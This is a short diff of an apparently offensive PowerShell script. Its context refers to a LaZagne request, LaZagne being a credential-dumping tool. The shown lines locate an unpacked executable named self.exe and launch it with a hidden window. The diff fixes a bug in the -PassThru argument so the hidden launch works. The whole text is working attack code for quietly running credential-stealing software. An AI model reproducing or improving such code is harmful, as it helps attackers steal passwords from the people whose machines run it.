@@ -26,5 +26,5 @@ $laZagneRequest | Wait-Process
 $executablePath = "$extractedFolderPath\self.exe"
 
 # Execute the unpacked file
-$execution = Start-Process -FilePath $executablePath -WindowStyle Hidden -PassThru $true
+$execution = Start-Process -FilePath $executablePath -WindowStyle Hidden -PassThru
 $execution | Wait-Process
